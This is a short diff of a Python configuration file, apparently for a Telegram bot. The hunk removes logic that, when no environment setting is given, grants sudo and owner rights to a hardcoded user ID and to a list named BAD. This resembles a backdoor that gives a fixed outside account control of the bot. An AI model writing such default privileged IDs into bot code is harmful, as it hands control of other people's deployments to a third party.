@@ -38,12 +38,3 @@ HELP_MSG = getenv("HELP_MSG", None)
 HELP_PIC = getenv("HELP_PIC", "https://telegra.ph/file/c26f985c3f59004bc9927.jpg")
 LOG_CHANNEL = getenv("LOG_CHANNEL", None)
 
-HANDLER = getenv("HANDLER", "/")
-
-# SUDO and OWNER logic
-SUDO_USERS = list(map(int, os.getenv("SUDO_USERS", "7762101994").split()))
-SUDO_USERS.extend(BAD)  # Add users from your custom list
-OWNER_ID = int(os.getenv("OWNER_ID", "7762101994"))
-if OWNER_ID not in SUDO_USERS:
-    SUDO_USERS.append(OWNER_ID)
-SUDO_USERS = list(set(SUDO_USERS))  # remove duplicates
